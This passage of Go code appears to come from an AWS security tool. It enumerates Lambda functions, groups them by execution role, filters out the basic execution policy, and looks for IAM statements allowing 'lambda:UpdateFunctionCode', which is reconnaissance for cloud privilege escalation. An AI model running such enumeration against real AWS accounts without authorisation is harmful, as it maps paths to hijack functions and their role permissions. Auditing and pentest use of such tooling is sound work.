		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				for _, i := range actions {
					if j, ok := i.(string); ok {
						if s.Effect == "Allow" && j == "lambda:UpdateFunctionCode" &&
							(r.MatchString(s.Resource) || s.Resource == "*") {
							return s.Resource, true, false
						}
					}
				}
			} else {
				if s.Effect == "Allow" && s.Action == "lambda:UpdateFunctionCode" &&
					(r.MatchString(s.Resource) || s.Resource == "*") {
					return s.Resource, true, false
				}
			}
		}
		return "", false, false
	}
}

// sortFuntionsByRoles sorts lambda functions, looking for functions with policies that may be
// of interest
func sortFuntionsByRoles(client *iam.Client, funcsOutput []*lambda.ListFunctionsOutput) []*funcData {
	commonLambdaPols := []string{"AWSLambdaBasicExecutionRole"} // policy names we don't care to keep track of
	viewedRoles := make(map[*string]bool)                       // keeps track of unique roles in functions we've iterated over
	uniqueFuncs := make([]*funcData, 0)                         // contains functions with unique policies

	for _, i := range funcsOutput {
		for _, y := range i.Functions {
			if _, ok := viewedRoles[y.Role]; !ok { // only look at roles we haven't seen
				policies, err := listAttachedRolePolicies(client, strings.Split(*y.Role, "/")[1])
				if err != nil {
					fmt.Println(err)
					return nil
				}

				uniquePols := make([]*Policy, 0)
				for _, v := range policies {
					good := true
					for _, j := range commonLambdaPols {
						if *v.PolicyName == j {
							good = false
							break
						}
					}
					if good {
						p, err := getPolicy(client, v.PolicyArn)
						if err == nil {
							p.Name = *v.PolicyName
							uniquePols = append(uniquePols, p)
						}
					}
				}

				// only add as a unique function if it contains a possibly interesting policy
				if len(uniquePols) > 0 {
					uniqueFuncs = append(uniqueFuncs, &funcData{policies: uniquePols, Role: *y.Role,
						Arn: *y.FunctionArn, Handler: *y.Handler})
				}
				viewedRoles[y.Role] = true
			}
		}
	}
	return uniqueFuncs
}

// listAttachedRolePolicies lists all policies attached to a role
func listAttachedRolePolicies(client *iam.Client, role string) ([]types.AttachedPolicy, error) {
	output, err := client.ListAttachedRolePolicies(context.TODO(), &iam.ListAttachedRolePoliciesInput{
		RoleName: aws.String(role),
	})
	if err != nil {
		return nil, err
	}
	return output.AttachedPolicies, nil
}
